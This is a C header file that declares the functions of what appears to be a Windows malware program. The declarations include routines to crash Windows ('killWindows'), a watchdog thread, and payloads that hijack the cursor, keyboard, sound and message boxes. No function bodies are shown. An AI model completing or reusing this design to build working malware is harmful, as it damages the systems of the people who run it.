#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>

#include "data.h"
#include "payloads.h"

int random();
void strReverseW(LPWSTR str);

DWORD WINAPI ripMessageThread(LPVOID);
DWORD WINAPI payloadThread(LPVOID);
DWORD WINAPI watchdogThread(LPVOID);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

void killWindows();
void killWindowsInstant();

int payloadExecute(int, int);
int payloadCursor(int, int);
int payloadBlink(int, int);
int payloadMessageBox(int, int);
DWORD WINAPI messageBoxThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
int payloadChangeText(int, int);
BOOL CALLBACK EnumWindowProc(HWND, LPARAM);
void enumerateChildren(HWND);
int payloadSound(int, int);
int payloadPuzzle(int, int);
int payloadKeyboard(int, int);
int payloadPIP(int, int);

extern int scrw, scrh;